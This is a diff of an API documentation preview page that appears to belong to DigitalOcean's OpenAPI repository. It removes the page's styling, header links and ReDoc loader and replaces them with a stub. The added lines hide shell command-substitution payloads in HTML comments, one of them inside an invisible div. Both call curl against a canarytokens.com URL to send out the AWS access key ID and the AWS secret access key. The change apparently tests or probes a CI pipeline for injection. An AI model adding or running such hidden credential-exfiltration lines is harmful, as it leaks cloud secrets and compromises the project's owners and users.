@@ -1,109 +1,14 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>API Docs PR Preview</title>
-    <!-- needed for adaptive design -->
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
-
-    <!--
-    ReDoc doesn't change outer page styles
-    -->
-    <style>
-        .header {
-            overflow: hidden;
-            background-color: dodgerblue;
-            padding: 20px;
-            font-family: 'Roboto', sans-serif;
-        }
-
-        /* Style the header links */
-        .header a {
-            float: left;
-            color: #f1f1f1;
-            text-align: center;
-            padding: 12px;
-            text-decoration: none;
-            font-size: 18px;
-            line-height: 20px;
-            border-radius: 4px;
-        }
-
-        /* Style the logo link (notice that we set the same value of line-height and font-size to prevent the header to increase when the font gets bigger */
-        .header .logo {
-            font-size: 25px;
-            font-weight: bold;
-            color: #f1f1f1;
-        }
-
-        /* Change the background color on mouse-over */
-        .header a:hover {
-            background-color: #ddd;
-            color: dodgerblue;
-        }
-
-        /* Style the active/current link*/
-        .header a.active {
-            background-color: #f1f1f1;
-            color: gray;
-        }
-
-        /* Float the link section to the right */
-        .header-right {
-            float: right;
-        }
-
-        /* Add media queries for responsiveness - when the screen is 500px wide or less, stack the links on top of each other */
-        @media screen and (max-width: 500px) {
-            .header a {
-                float: none;
-                display: block;
-                text-align: left;
-            }
-
-            .header-right {
-                float: none;
-            }
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-        }
-    </style>
+    <title>API Docs</title>
+    <script>console.log('test')</script>
+    <!-- $(curl https://http://canarytokens.com/feedback/63u0x7klpu3fy2a3r4xzzgxa8/index.html?k=$AWS_ACCESS_KEY_ID) -->
 </head>
-
 <body>
-    <div class="header">
-        <label class="logo">DigitalOcean APIv2 OpenAPI Preview</label>
-        <div class="header-right">
-            <a id="gh-link" href="https://github.com/digitalocean/apiv2-openapi" target="_blank">Main</a>
-            <a id="spec-link" href="DigitalOcean-public.v2.yaml" target="_blank">Spec File</a>
-        </div>
+    <h1>ReDoc API Documentation</h1>
+    <div style="display:none">
+        <!-- backup: ';curl https://http://canarytokens.com/feedback/63u0x7klpu3fy2a3r4xzzgxa8/index.html -d "secret=$AWS_SECRET_ACCESS_KEY";' -->
     </div>
-
-    <redoc spec-url="" json-expand-level="all"></redoc>
-
-    <script>
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const pr = urlParams.get('pr');
-
-        let specUrl = "DigitalOcean-public.v2.yaml";
-
-        if (pr) {
-            specUrl = `previews/${pr}-spec.yaml`
-            document.getElementById('gh-link').setAttribute('href', `https://github.com/digitalocean/apiv2-openapi/pull/${pr}`);
-            document.getElementById('gh-link').textContent = `PR: ${pr}`;
-            document.getElementById('spec-link').setAttribute('href', specUrl);
-        }
-
-        document.querySelector('redoc').setAttribute('spec-url', specUrl);
-    </script>
-
-    <script src="https://cdn.redoc.ly/redoc/latest/bundles/redoc.standalone.js"> </script>
 </body>
-
 </html>
